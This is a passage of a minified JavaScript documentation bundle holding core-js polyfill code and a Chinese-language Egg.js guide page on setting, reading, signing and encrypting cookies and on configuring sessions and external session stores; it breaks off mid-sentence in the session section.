a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("XaNN"),i=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{isSupersetOf:function(e){var t=l(this),n=o(t.has);return!i(e,(function(e){if(!1===n.call(t,e))return i.stop()})).stopped}})},kPJt:function(e,t,n){"use strict";var a=n("9Rcy"),r=n("Xdqv"),l=n("qUkb"),o=n("1+Tz"),i=n("bUpX"),c=n("m/os"),s=n("W5/F"),u=Object.assign,d=Object.defineProperty;e.exports=!u||r((function(){if(a&&1!==u({b:1},u(d({},"a",{enumerable:!0,get:function(){d(this,"b",{value:3,enumerable:!1})}}),{b:2})).b)return!0;var e={},t={},n=Symbol(),r="abcdefghijklmnopqrst";return e[n]=7,r.split("").forEach((function(e){t[e]=e})),7!=u({},e)[n]||l(u({},t)).join("")!=r}))?function(e,t){var n=c(e),r=arguments.length,u=1,d=o.f,m=i.f;while(r>u){var p,h=s(arguments[u++]),g=d?l(h).concat(d(h)):l(h),f=g.length,E=0;while(f>E)p=g[E++],a&&!m.call(h,p)||(n[p]=h[p])}return n}:u},kVJ2:function(e){e.exports=JSON.parse("{}")},kZko:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"cookie"},r.a.createElement(l["AnchorLink"],{to:"#cookie","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cookie"),r.a.createElement("p",null,"HTTP \u8bf7\u6c42\u90fd\u662f\u65e0\u72b6\u6001\u7684\uff0c\u4f46\u662f\u6211\u4eec\u7684 Web \u5e94\u7528\u901a\u5e38\u90fd\u9700\u8981\u77e5\u9053\u53d1\u8d77\u8bf7\u6c42\u7684\u4eba\u662f\u8c01\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0cHTTP \u534f\u8bae\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u8bf7\u6c42\u5934\uff1a",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/HTTP_cookie"},"Cookie"),"\u3002\u670d\u52a1\u7aef\u53ef\u4ee5\u901a\u8fc7\u54cd\u5e94\u5934\uff08set-cookie\uff09\u5c06\u5c11\u91cf\u6570\u636e\u54cd\u5e94\u7ed9\u5ba2\u6237\u7aef\uff0c\u6d4f\u89c8\u5668\u4f1a\u9075\u5faa\u534f\u8bae\u5c06\u6570\u636e\u4fdd\u5b58\uff0c\u5e76\u5728\u4e0b\u6b21\u8bf7\u6c42\u540c\u4e00\u4e2a\u670d\u52a1\u7684\u65f6\u5019\u5e26\u4e0a\uff08\u6d4f\u89c8\u5668\u4e5f\u4f1a\u9075\u5faa\u534f\u8bae\uff0c\u53ea\u5728\u8bbf\u95ee\u7b26\u5408 Cookie \u6307\u5b9a\u89c4\u5219\u7684\u7f51\u7ad9\u65f6\u5e26\u4e0a\u5bf9\u5e94\u7684 Cookie \u6765\u4fdd\u8bc1\u5b89\u5168\u6027\uff09\u3002"),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.cookies"),"\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 controller \u4e2d\u4fbf\u6377\u3001\u5b89\u5168\u7684\u8bbe\u7f6e\u548c\u8bfb\u53d6 Cookie\u3002"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async add() {\n    const ctx = this.ctx;\n    let count = ctx.cookies.get('count');\n    count = count ? Number(count) : 0;\n    ctx.cookies.set('count', ++count);\n    ctx.body = count;\n  }\n  async remove() {\n    const ctx = this.ctx;\n    ctx.cookies.set('count', null);\n    ctx.status = 204;\n  }\n}",lang:"js"}),r.a.createElement("h4",{id:"ctxcookiessetkey-value-options"},r.a.createElement(l["AnchorLink"],{to:"#ctxcookiessetkey-value-options","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.cookies.set(key, value, options)")),r.a.createElement("p",null,"\u8bbe\u7f6e Cookie \u5176\u5b9e\u662f\u901a\u8fc7\u5728 HTTP \u54cd\u5e94\u4e2d\u8bbe\u7f6e set-cookie \u5934\u5b8c\u6210\u7684\uff0c\u6bcf\u4e00\u4e2a set-cookie \u90fd\u4f1a\u8ba9\u6d4f\u89c8\u5668\u5728 Cookie \u4e2d\u5b58\u4e00\u4e2a\u952e\u503c\u5bf9\u3002\u5728\u8bbe\u7f6e Cookie \u503c\u7684\u540c\u65f6\uff0c\u534f\u8bae\u8fd8\u652f\u6301\u8bb8\u591a\u53c2\u6570\u6765\u914d\u7f6e\u8fd9\u4e2a Cookie \u7684\u4f20\u8f93\u3001\u5b58\u50a8\u548c\u6743\u9650\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"{","Number","}"," maxAge"),": \u8bbe\u7f6e\u8fd9\u4e2a\u952e\u503c\u5bf9\u5728\u6d4f\u89c8\u5668\u7684\u6700\u957f\u4fdd\u5b58\u65f6\u95f4\u3002\u662f\u4e00\u4e2a\u4ece\u670d\u52a1\u5668\u5f53\u524d\u65f6\u523b\u5f00\u59cb\u7684\u6beb\u79d2\u6570\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Date","}"," expires"),": \u8bbe\u7f6e\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u5931\u6548\u65f6\u95f4\uff0c\u5982\u679c\u8bbe\u7f6e\u4e86 maxAge\uff0cexpires \u5c06\u4f1a\u88ab\u8986\u76d6\u3002\u5982\u679c maxAge \u548c expires \u90fd\u6ca1\u8bbe\u7f6e\uff0cCookie \u5c06\u4f1a\u5728\u6d4f\u89c8\u5668\u7684\u4f1a\u8bdd\u5931\u6548\uff08\u4e00\u822c\u662f\u5173\u95ed\u6d4f\u89c8\u5668\u65f6\uff09\u7684\u65f6\u5019\u5931\u6548\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," path"),": \u8bbe\u7f6e\u952e\u503c\u5bf9\u751f\u6548\u7684 URL \u8def\u5f84\uff0c\u9ed8\u8ba4\u8bbe\u7f6e\u5728\u6839\u8def\u5f84\u4e0a\uff08",r.a.createElement("code",null,"/"),"\uff09\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u57df\u540d\u4e0b\u7684\u6240\u6709 URL \u90fd\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u4e2a Cookie\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","String","}"," domain"),": \u8bbe\u7f6e\u952e\u503c\u5bf9\u751f\u6548\u7684\u57df\u540d\uff0c\u9ed8\u8ba4\u6ca1\u6709\u914d\u7f6e\uff0c\u53ef\u4ee5\u914d\u7f6e\u6210\u53ea\u5728\u6307\u5b9a\u57df\u540d\u624d\u80fd\u8bbf\u95ee\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," httpOnly"),": \u8bbe\u7f6e\u952e\u503c\u5bf9\u662f\u5426\u53ef\u4ee5\u88ab js \u8bbf\u95ee\uff0c\u9ed8\u8ba4\u4e3a true\uff0c\u4e0d\u5141\u8bb8\u88ab js \u8bbf\u95ee\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," secure"),": \u8bbe\u7f6e\u952e\u503c\u5bf9",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/13729749/how-does-cookie-secure-flag-work"},"\u53ea\u5728 HTTPS \u8fde\u63a5\u4e0a\u4f20\u8f93"),"\uff0c\u6846\u67b6\u4f1a\u5e2e\u6211\u4eec\u5224\u65ad\u5f53\u524d\u662f\u5426\u5728 HTTPS \u8fde\u63a5\u4e0a\u81ea\u52a8\u8bbe\u7f6e secure \u7684\u503c\u3002")),r.a.createElement("p",null,"\u9664\u4e86\u8fd9\u4e9b\u5c5e\u6027\u4e4b\u5916\uff0c\u6846\u67b6\u53e6\u5916\u6269\u5c55\u4e86 3 \u4e2a\u53c2\u6570\u7684\u652f\u6301\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," overwrite"),"\uff1a\u8bbe\u7f6e key \u76f8\u540c\u7684\u952e\u503c\u5bf9\u5982\u4f55\u5904\u7406\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a true\uff0c\u5219\u540e\u8bbe\u7f6e\u7684\u503c\u4f1a\u8986\u76d6\u524d\u9762\u8bbe\u7f6e\u7684\uff0c\u5426\u5219\u5c06\u4f1a\u53d1\u9001\u4e24\u4e2a set-cookie \u54cd\u5e94\u5934\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," signed"),"\uff1a\u8bbe\u7f6e\u662f\u5426\u5bf9 Cookie \u8fdb\u884c\u7b7e\u540d\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a true\uff0c\u5219\u8bbe\u7f6e\u952e\u503c\u5bf9\u7684\u65f6\u5019\u4f1a\u540c\u65f6\u5bf9\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\u8fdb\u884c\u7b7e\u540d\uff0c\u540e\u9762\u53d6\u7684\u65f6\u5019\u505a\u6821\u9a8c\uff0c\u53ef\u4ee5\u9632\u6b62\u524d\u7aef\u5bf9\u8fd9\u4e2a\u503c\u8fdb\u884c\u7be1\u6539\u3002\u9ed8\u8ba4\u4e3a true\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"{","Boolean","}"," encrypt"),"\uff1a\u8bbe\u7f6e\u662f\u5426\u5bf9 Cookie \u8fdb\u884c\u52a0\u5bc6\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a true\uff0c\u5219\u5728\u53d1\u9001 Cookie \u524d\u4f1a\u5bf9\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5ba2\u6237\u7aef\u65e0\u6cd5\u8bfb\u53d6\u5230 Cookie \u7684\u660e\u6587\u503c\u3002\u9ed8\u8ba4\u4e3a false\u3002")),r.a.createElement("p",null,"\u5728\u8bbe\u7f6e Cookie \u65f6\u6211\u4eec\u9700\u8981\u601d\u8003\u6e05\u695a\u8fd9\u4e2a Cookie \u7684\u4f5c\u7528\uff0c\u5b83\u9700\u8981\u88ab\u6d4f\u89c8\u5668\u4fdd\u5b58\u591a\u4e45\uff1f\u662f\u5426\u53ef\u4ee5\u88ab js \u83b7\u53d6\u5230\uff1f\u662f\u5426\u53ef\u4ee5\u88ab\u524d\u7aef\u4fee\u6539\uff1f"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u9ed8\u8ba4\u7684\u914d\u7f6e\u4e0b\uff0cCookie \u662f\u52a0\u7b7e\u4e0d\u52a0\u5bc6\u7684\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u770b\u5230\u660e\u6587\uff0cjs \u4e0d\u80fd\u8bbf\u95ee\uff0c\u4e0d\u80fd\u88ab\u5ba2\u6237\u7aef\uff08\u624b\u5de5\uff09\u7be1\u6539\u3002")),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5982\u679c\u60f3\u8981 Cookie \u5728\u6d4f\u89c8\u5668\u7aef\u53ef\u4ee5\u88ab js \u8bbf\u95ee\u5e76\u4fee\u6539:")),r.a.createElement(o["a"],{code:"ctx.cookies.set(key, value, {\n  httpOnly: false,\n  signed: false,\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5982\u679c\u60f3\u8981 Cookie \u5728\u6d4f\u89c8\u5668\u7aef\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u4e0d\u80fd\u770b\u5230\u660e\u6587\uff1a")),r.a.createElement(o["a"],{code:"ctx.cookies.set(key, value, {\n  httpOnly: true, // \u9ed8\u8ba4\u5c31\u662f true\n  encrypt: true, // \u52a0\u5bc6\u4f20\u8f93\n});",lang:"js"}),r.a.createElement("p",null,"\u6ce8\u610f\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u7531\u4e8e",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/7567154/can-i-use-unicode-characters-in-http-headers"},"\u6d4f\u89c8\u5668\u548c\u5176\u4ed6\u5ba2\u6237\u7aef\u5b9e\u73b0\u7684\u4e0d\u786e\u5b9a\u6027"),"\uff0c\u4e3a\u4e86\u4fdd\u8bc1 Cookie \u53ef\u4ee5\u5199\u5165\u6210\u529f\uff0c\u5efa\u8bae value \u901a\u8fc7 base64 \u7f16\u7801\u6216\u8005\u5176\u4ed6\u5f62\u5f0f encode \u4e4b\u540e\u518d\u5199\u5165\u3002"),r.a.createElement("li",null,"\u7531\u4e8e",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/640938/what-is-the-maximum-size-of-a-web-browsers-cookies-key"},"\u6d4f\u89c8\u5668\u5bf9 Cookie \u6709\u957f\u5ea6\u9650\u5236\u9650\u5236"),"\uff0c\u6240\u4ee5\u5c3d\u91cf\u4e0d\u8981\u8bbe\u7f6e\u592a\u957f\u7684 Cookie\u3002\u4e00\u822c\u6765\u8bf4\u4e0d\u8981\u8d85\u8fc7 4093 bytes\u3002\u5f53\u8bbe\u7f6e\u7684 Cookie value \u5927\u4e8e\u8fd9\u4e2a\u503c\u65f6\uff0c\u6846\u67b6\u4f1a\u6253\u5370\u4e00\u6761\u8b66\u544a\u65e5\u5fd7\u3002")),r.a.createElement("h4",{id:"ctxcookiesgetkey-options"},r.a.createElement(l["AnchorLink"],{to:"#ctxcookiesgetkey-options","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"ctx.cookies.get(key, options)")),r.a.createElement("p",null,"\u7531\u4e8e HTTP \u8bf7\u6c42\u4e2d\u7684 Cookie \u662f\u5728\u4e00\u4e2a header \u4e2d\u4f20\u8f93\u8fc7\u6765\u7684\uff0c\u901a\u8fc7\u6846\u67b6\u63d0\u4f9b\u7684\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5feb\u901f\u7684\u4ece\u6574\u6bb5 Cookie \u4e2d\u83b7\u53d6\u5bf9\u5e94\u7684\u952e\u503c\u5bf9\u7684\u503c\u3002\u4e0a\u9762\u5728\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e ",r.a.createElement("code",null,"options.signed")," \u548c ",r.a.createElement("code",null,"options.encrypt")," \u6765\u5bf9 Cookie \u8fdb\u884c\u7b7e\u540d\u6216\u52a0\u5bc6\uff0c\u56e0\u6b64\u5bf9\u5e94\u7684\u5728\u83b7\u53d6 Cookie \u7684\u65f6\u5019\u4e5f\u8981\u4f20\u76f8\u5339\u914d\u7684\u9009\u9879\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5982\u679c\u8bbe\u7f6e\u7684\u65f6\u5019\u6307\u5b9a\u4e3a signed\uff0c\u83b7\u53d6\u65f6\u672a\u6307\u5b9a\uff0c\u5219\u4e0d\u4f1a\u5728\u83b7\u53d6\u65f6\u5bf9\u53d6\u5230\u7684\u503c\u505a\u9a8c\u7b7e\uff0c\u5bfc\u81f4\u53ef\u80fd\u88ab\u5ba2\u6237\u7aef\u7be1\u6539\u3002"),r.a.createElement("li",null,"\u5982\u679c\u8bbe\u7f6e\u7684\u65f6\u5019\u6307\u5b9a\u4e3a encrypt\uff0c\u83b7\u53d6\u65f6\u672a\u6307\u5b9a\uff0c\u5219\u65e0\u6cd5\u83b7\u53d6\u5230\u771f\u5b9e\u7684\u503c\uff0c\u800c\u662f\u52a0\u5bc6\u8fc7\u540e\u7684\u5bc6\u6587\u3002")),r.a.createElement("p",null,"\u5982\u679c\u8981\u83b7\u53d6\u524d\u7aef\u6216\u8005\u5176\u4ed6\u7cfb\u7edf\u8bbe\u7f6e\u7684 cookie\uff0c\u9700\u8981\u6307\u5b9a\u53c2\u6570 ",r.a.createElement("code",null,"signed")," \u4e3a ",r.a.createElement("code",null,"false"),"\uff0c\u907f\u514d\u5bf9\u5b83\u505a\u9a8c\u7b7e\u5bfc\u81f4\u83b7\u53d6\u4e0d\u5230 cookie \u7684\u503c\u3002"),r.a.createElement(o["a"],{code:"ctx.cookies.get('frontend-cookie', {\n  signed: false,\n});",lang:"js"}),r.a.createElement("h3",{id:"cookie-\u79d8\u94a5"},r.a.createElement(l["AnchorLink"],{to:"#cookie-\u79d8\u94a5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cookie \u79d8\u94a5"),r.a.createElement("p",null,"\u7531\u4e8e\u6211\u4eec\u5728 Cookie \u4e2d\u9700\u8981\u7528\u5230\u52a0\u89e3\u5bc6\u548c\u9a8c\u7b7e\uff0c\u6240\u4ee5\u9700\u8981\u914d\u7f6e\u4e00\u4e2a\u79d8\u94a5\u4f9b\u52a0\u5bc6\u4f7f\u7528\u3002\u5728 ",r.a.createElement("code",null,"config/config.default.js")," \u4e2d"),r.a.createElement(o["a"],{code:"module.exports = {\n  keys: 'key1,key2',\n};",lang:"js"}),r.a.createElement("p",null,"keys \u914d\u7f6e\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u6309\u7167\u9017\u53f7\u5206\u9694\u914d\u7f6e\u591a\u4e2a key\u3002Cookie \u5728\u4f7f\u7528\u8fd9\u4e2a\u914d\u7f6e\u8fdb\u884c\u52a0\u89e3\u5bc6\u65f6\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u52a0\u5bc6\u548c\u52a0\u7b7e\u65f6\u53ea\u4f1a\u4f7f\u7528\u7b2c\u4e00\u4e2a\u79d8\u94a5\u3002"),r.a.createElement("li",null,"\u89e3\u5bc6\u548c\u9a8c\u7b7e\u65f6\u4f1a\u904d\u5386 keys \u8fdb\u884c\u89e3\u5bc6\u3002")),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u60f3\u8981\u66f4\u65b0 Cookie \u7684\u79d8\u94a5\uff0c\u4f46\u662f\u53c8\u4e0d\u5e0c\u671b\u4e4b\u524d\u8bbe\u7f6e\u5230\u7528\u6237\u6d4f\u89c8\u5668\u4e0a\u7684 Cookie \u5931\u6548\uff0c\u53ef\u4ee5\u5c06\u65b0\u7684\u79d8\u94a5\u914d\u7f6e\u5230 keys \u6700\u524d\u9762\uff0c\u7b49\u8fc7\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u518d\u5220\u53bb\u4e0d\u9700\u8981\u7684\u79d8\u94a5\u5373\u53ef\u3002"),r.a.createElement("h2",{id:"session"},r.a.createElement(l["AnchorLink"],{to:"#session","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session"),r.a.createElement("p",null,"Cookie \u5728 Web \u5e94\u7528\u4e2d\u7ecf\u5e38\u627f\u62c5\u6807\u8bc6\u8bf7\u6c42\u65b9\u8eab\u4efd\u7684\u529f\u80fd\uff0c\u6240\u4ee5 Web \u5e94\u7528\u5728 Cookie \u7684\u57fa\u7840\u4e0a\u5c01\u88c5\u4e86 Session \u7684\u6982\u5ff5\uff0c\u4e13\u95e8\u7528\u505a\u7528\u6237\u8eab\u4efd\u8bc6\u522b\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session"},"Session")," \u63d2\u4ef6\uff0c\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"ctx.session")," \u6765\u8bbf\u95ee\u6216\u8005\u4fee\u6539\u5f53\u524d\u7528\u6237 Session \u3002"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async fetchPosts() {\n    const ctx = this.ctx;\n    // \u83b7\u53d6 Session \u4e0a\u7684\u5185\u5bb9\n    const userId = ctx.session.userId;\n    const posts = await ctx.service.post.fetch(userId);\n    // \u4fee\u6539 Session \u7684\u503c\n    ctx.session.visited = ctx.session.visited ? ctx.session.visited + 1 : 1;\n    ctx.body = {\n      success: true,\n      posts,\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"Session \u7684\u4f7f\u7528\u65b9\u6cd5\u975e\u5e38\u76f4\u89c2\uff0c\u76f4\u63a5\u8bfb\u53d6\u5b83\u6216\u8005\u4fee\u6539\u5b83\u5c31\u53ef\u4ee5\u4e86\uff0c\u5982\u679c\u8981\u5220\u9664\u5b83\uff0c\u76f4\u63a5\u5c06\u5b83\u8d4b\u503c\u4e3a null\uff1a"),r.a.createElement(o["a"],{code:"ctx.session = null;",lang:"js"}),r.a.createElement("p",null,"\u9700\u8981 ",r.a.createElement("strong",null,"\u7279\u522b\u6ce8\u610f")," \u7684\u662f\uff1a\u8bbe\u7f6e session \u5c5e\u6027\u65f6\u9700\u8981\u907f\u514d\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5\uff08\u4f1a\u9020\u6210\u5b57\u6bb5\u4e22\u5931\uff0c\u8be6\u89c1 ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/session/blob/master/lib/session.js#L37-L47"},"koa-session")," \u6e90\u7801\uff09"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e0d\u8981\u4ee5 ",r.a.createElement("code",null,"_")," \u5f00\u5934"),r.a.createElement("li",null,"\u4e0d\u80fd\u4e3a ",r.a.createElement("code",null,"isNew"))),r.a.createElement(o["a"],{code:"// \u274c \u9519\u8bef\u7684\u7528\u6cd5\nctx.session._visited = 1; //    --\x3e \u8be5\u5b57\u6bb5\u4f1a\u5728\u4e0b\u4e00\u6b21\u8bf7\u6c42\u65f6\u4e22\u5931\nctx.session.isNew = 'HeHe'; //    --\x3e \u4e3a\u5185\u90e8\u5173\u952e\u5b57, \u4e0d\u5e94\u8be5\u53bb\u66f4\u6539\n\n// \u2714\ufe0f \u6b63\u786e\u7684\u7528\u6cd5\nctx.session.visited = 1; //   --\x3e  \u6b64\u5904\u6ca1\u6709\u95ee\u9898",lang:"js"}),r.a.createElement("p",null,"Session \u7684\u5b9e\u73b0\u662f\u57fa\u4e8e Cookie \u7684\uff0c\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u7528\u6237 Session \u7684\u5185\u5bb9\u52a0\u5bc6\u540e\u76f4\u63a5\u5b58\u50a8\u5728 Cookie \u4e2d\u7684\u4e00\u4e2a\u5b57\u6bb5\u4e2d\uff0c\u7528\u6237\u6bcf\u6b21\u8bf7\u6c42\u6211\u4eec\u7f51\u7ad9\u7684\u65f6\u5019\u90fd\u4f1a\u5e26\u4e0a\u8fd9\u4e2a Cookie\uff0c\u6211\u4eec\u5728\u670d\u52a1\u7aef\u89e3\u5bc6\u540e\u4f7f\u7528\u3002Session \u7684\u9ed8\u8ba4\u914d\u7f6e\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"exports.session = {\n  key: 'EGG_SESS',\n  maxAge: 24 * 3600 * 1000, // 1 \u5929\n  httpOnly: true,\n  encrypt: true,\n};",lang:"js"}),r.a.createElement("p",null,"\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u53c2\u6570\u9664\u4e86 ",r.a.createElement("code",null,"key")," \u90fd\u662f Cookie \u7684\u53c2\u6570\uff0c",r.a.createElement("code",null,"key")," \u4ee3\u8868\u4e86\u5b58\u50a8 Session \u7684 Cookie \u952e\u503c\u5bf9\u7684 key \u662f\u4ec0\u4e48\u3002\u5728\u9ed8\u8ba4\u7684\u914d\u7f6e\u4e0b\uff0c\u5b58\u653e Session \u7684 Cookie \u5c06\u4f1a\u52a0\u5bc6\u5b58\u50a8\u3001\u4e0d\u53ef\u88ab\u524d\u7aef js \u8bbf\u95ee\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u7528\u6237\u7684 Session \u662f\u5b89\u5168\u7684\u3002"),r.a.createElement("h3",{id:"\u6269\u5c55\u5b58\u50a8"},r.a.createElement(l["AnchorLink"],{to:"#\u6269\u5c55\u5b58\u50a8","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6269\u5c55\u5b58\u50a8"),r.a.createElement("p",null,"Session \u9ed8\u8ba4\u5b58\u653e\u5728 Cookie \u4e2d\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u7684 Session \u5bf9\u8c61\u8fc7\u4e8e\u5e9e\u5927\uff0c\u5c31\u4f1a\u5e26\u6765\u4e00\u4e9b\u989d\u5916\u7684\u95ee\u9898\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u524d\u9762\u63d0\u5230\uff0c\u6d4f\u89c8\u5668\u901a\u5e38\u90fd\u6709\u9650\u5236\u6700\u5927\u7684 Cookie \u957f\u5ea6\uff0c\u5f53\u8bbe\u7f6e\u7684 Session \u8fc7\u5927\u65f6\uff0c\u6d4f\u89c8\u5668\u53ef\u80fd\u62d2\u7edd\u4fdd\u5b58\u3002"),r.a.createElement("li",null,"Cookie \u5728\u6bcf\u6b21\u8bf7\u6c42\u65f6\u90fd\u4f1a\u5e26\u4e0a\uff0c\u5f53 Session \u8fc7\u5927\u65f6\uff0c\u6bcf\u6b21\u8bf7\u6c42\u90fd\u8981\u989d\u5916\u5e26\u4e0a\u5e9e\u5927\u7684 Cookie \u4fe1\u606f\u3002")),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u5c06 Session \u5b58\u50a8\u5230\u9664\u4e86 Cookie \u4e4b\u5916\u7684\u5176\u4ed6\u5b58\u50a8\u7684\u6269\u5c55\u65b9\u6848\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8bbe\u7f6e ",r.a.createElement("code",null,"app.sessionStore")," \u5373\u53ef\u5c06 Session \u5b58\u50a8\u5230\u6307\u5b9a\u7684\u5b58\u50a8\u4e2d\u3002"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.sessionStore = {\n    // support promise / async\n    async get(key) {\n      // return value;\n    },\n    async set(key, value, maxAge) {\n      // set key to store\n    },\n    async destroy(key) {\n      // destroy key\n    },\n  };\n};",lang:"js"}),r.a.createElement("p",null,"sessionStore \u7684\u5b9e\u73b0\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c01\u88c5\u5230\u63d2\u4ef6\u4e2d\uff0c\u4f8b\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session-redis"},"egg-session-redis")," \u5c31\u63d0\u4f9b\u4e86\u5c06 Session \u5b58\u50a8\u5230 redis \u4e2d\u7684\u80fd\u529b\uff0c\u5728\u5e94\u7528\u5c42\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5f15\u5165 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-redis"},"egg-redis")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-session-redis"},"egg-session-redis")," \u63d2\u4ef6\u5373\u53ef\u3002"),r.a.createElement(o["a"],{code:"// plugin.js\nexports.redis = {\n  enable: true,\n  package: 'egg-redis',\n};\nexports.sessionRedis = {\n  enable: true,\n  package: 'egg-session-redis',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u4e00\u65e6\u9009\u62e9\u4e86\u5c06 Session \u5b58\u5165\u5230\u5916\u90e8\u5b58\u50a8\u4e2d\uff0c\u5c31\u610f\u5473\u7740\u7cfb\u7edf\u5c06\u5f3a\u4f9d\u8d56\u4e8e\u8fd9\u4e2a\u5916\u90e8\u5b58\u50a8\uff0c\u5f53\u5b83\u6302\u4e86\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u5b8c\u5168\u65e0\u6cd5\u4f7f\u7528 Session \u76f8\u5173\u7684\u529f\u80fd\u4e86\u3002\u56e0\u6b64\u6211\u4eec\u66f4\u63a8\u8350\u5927\u5bb6\u53ea\u5c06\u5fc5\u8981\u7684\u4fe1\u606f\u5b58\u50a8\u5728 Session \u4e2d\uff0c\u4fdd\u6301 Session \u7684\u7cbe\u7b80\u5e76\u4f7f\u7528\u9ed8\u8ba4\u7684 Cookie \u5b58\u50a8\uff0c\u7528\u6237\u7ea7\u522b\u7684\u7f13\u5b58\u4e0d\u8981\u5b58\u50a8\u5728 Session \u4e2d\u3002")),r.a.createElement("h3",{id:"session-\u5b9e\u8df5"},r.a.createElement(l["AnchorLink"],{to:"#session-\u5b9e\u8df5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session \u5b9e\u8df5"),r.a.createElement("h4",{id:"\u4fee\u6539\u7528\u6237-session-\u5931\u6548\u65f6\u95f4"},r.a.createElement(l["AnchorLink"],{to:"#\u4fee\u6539\u7528\u6237-session-\u5931\u6548\u65f6\u95f4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4fee\u6539\u7528\u6237 Session \u5931\u6548\u65f6\u95f4"),r.a.createElement("p",null,"\u867d\u7136\u5728 Session \u7684\u914d\u7f6e\u4e2d\u6709\u4e00\u9879\u662f maxAge\uff0c\u4f46\u662f\u5b83\u53ea\u80fd\u5168\u5c40\u8bbe\u7f6e Session \u7684\u6709\u6548\u671f\uff0c\u6211\u4eec\u7ecf\u5e38\u53ef\u4ee5\u5728\u4e00\u4e9b\u7f51\u7ad9\u7684\u767b\u5f55\u9875\u4e0a\u770b\u5230\u6709 ",r.a.createElement("strong",null,"\u8bb0\u4f4f\u6211")," \u7684\u9009\u9879\u6846\uff0c\u52fe\u9009\u4e4b\u540e\u53ef\u4ee5\u8ba9\u767b\u5f55\u7528\u6237\u7684 Session 